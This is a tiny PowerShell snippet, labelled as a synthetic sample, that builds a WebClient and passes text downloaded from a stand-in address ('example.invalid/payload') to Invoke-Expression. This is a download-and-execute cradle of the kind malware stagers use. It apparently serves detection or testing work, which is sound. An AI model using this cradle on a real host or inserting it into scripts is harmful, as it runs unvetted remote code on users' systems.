# Synthetic PowerShell download cradle
$w = New-Object Net.WebClient
IEX $w.DownloadString('http://example.invalid/payload')
